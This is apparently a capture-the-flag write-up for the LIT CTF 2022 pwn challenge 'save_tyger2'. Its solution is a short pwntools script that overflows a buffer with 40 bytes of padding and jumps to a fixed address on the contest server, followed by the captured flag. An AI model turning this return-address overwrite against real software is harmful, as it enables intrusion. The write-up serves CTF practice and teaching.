# LIT CTF 2022 – save_tyger2

* **Category:** pwn
* **Points:** 500

## Challenge

> Tyger needs your help again.

## Solution

```python
from pwn import *
elf = context.binary = ELF('./save_tyger2',checksec=False)
#p = process()
p = remote('litctf.live',31788)
offset = 40

payload = flat(
	offset * "A",
	0x401162
	)
log.info(p.clean())
p.sendline(payload)
p.interactive()
```

```
LITCTF{w3_w0nt_l3t_th3m_t4k3_tyg3r_3v3r_4gain}
```
